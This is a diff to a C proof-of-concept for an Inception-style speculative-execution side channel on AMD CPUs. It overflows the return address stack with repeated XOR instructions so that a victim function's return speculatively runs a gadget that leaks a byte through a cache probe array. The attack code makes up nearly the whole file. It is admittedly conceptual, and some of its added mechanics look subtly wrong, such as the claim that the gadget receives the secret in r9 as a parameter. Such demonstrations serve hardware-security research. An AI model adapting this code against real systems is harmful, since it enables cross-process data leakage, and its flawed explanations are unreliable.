@@ -6,12 +6,21 @@
 uint8_t secret_inception_data = 'I'; // Secret to leak
 
 // Gadget function to leak a byte
+// This function will be called speculatively when RAS is poisoned
 __attribute__((noinline)) void leak_gadget_inception(uint8_t value)
 {
+    // Use the secret value to access the probe array
+    // This creates a cache side-channel that can be measured
     probe_array[value * CACHE_LINE_SIZE] = 1;
+
+    // Add some computation to make the speculative execution more realistic
+    volatile int dummy = value * 2;
+    (void)dummy; // Suppress unused variable warning
 }
 
 // Victim function with a return instruction that will be misdirected speculatively.
+// In a real attack, this would be a function in the victim's code that the attacker
+// can trigger to execute a return instruction.
 __attribute__((noinline)) void victim_function_inception()
 {
     volatile int dummy = 0;
@@ -19,7 +28,10 @@ __attribute__((noinline)) void victim_function_inception()
     {
         dummy += i;
     }
-    // Implicit 'ret' here is the target.
+    // The return instruction here is the target of the attack
+    // When the CPU speculatively executes this return, it should use
+    // the poisoned RAS entry (our gadget address) instead of the real return address
+    (void)dummy; // Suppress unused variable warning
 }
 
 int main()
@@ -33,6 +45,8 @@ int main()
     // The ETH Zurich paper points to XOR instructions being speculatively interpreted as CALLs.
     // This requires precise inline assembly to construct the "trigger code."
     printf("Triggering phantom speculation to overflow RAS...\n");
+    printf("Setting up r8 with gadget address: %p\n", (void *)&leak_gadget_inception);
+    printf("Setting up r9 with secret data: %c (0x%02x)\n", secret_inception_data, secret_inception_data);
 
     // The actual code would be a highly-tuned inline assembly loop.
     // Example (conceptual, not guaranteed to work on any specific CPU):
@@ -48,17 +62,19 @@ int main()
     // 2. Repeatedly executing a sequence of instructions (like `XOR`) that are known to
     //    trigger the phantom `CALL` behavior on the target AMD CPU.
 
-    register void *gadget asm("r8") = &leak_gadget_inception;
-    register uint8_t secret asm("r9") = secret_inception_data;
+    // Set up registers for the attack
+    // r8 will contain the gadget address, r9 will contain the secret
     __asm__ __volatile__(
-        ".rept 256\n\t"
-        "xor %%eax, %%eax\n\t"
-        "nop\n\t"
+        "mov %0, %%r8\n\t"     // Load gadget address into r8
+        "mov %1, %%r9\n\t"     // Load secret into r9
+        ".rept 256\n\t"        // Repeat many times to overflow RAS
+        "xor %%eax, %%eax\n\t" // This might be speculatively interpreted as CALL
+        "nop\n\t"              // Padding
         "nop\n\t"
         "nop\n\t"
         ".endr\n"
         :
-        : "r"(gadget), "r"(secret)
+        : "r"(&leak_gadget_inception), "r"(secret_inception_data)
         : "rax", "r8", "r9");
     _mm_mfence(); // Ensure RAS updates are visible globally
 
@@ -71,8 +87,19 @@ int main()
     _mm_lfence();
 
     printf("Triggering victim function with return...\n");
+
+    // Set up the attack: ensure r8 and r9 are still loaded with our values
+    __asm__ __volatile__(
+        "mov %0, %%r8\n\t" // Ensure gadget address is in r8
+        "mov %1, %%r9\n\t" // Ensure secret is in r9
+        :
+        : "r"(&leak_gadget_inception), "r"(secret_inception_data)
+        : "r8", "r9");
+
+    // Call the victim function - its return instruction should be misdirected
     victim_function_inception(); // This will execute a 'ret' instruction.
                                  // Speculatively, due to poisoned RAS, it returns to gadget.
+                                 // The gadget will be called with the secret in r9 as parameter.
 
     // Add a fence to ensure speculative effects propagate to cache
     _mm_lfence();
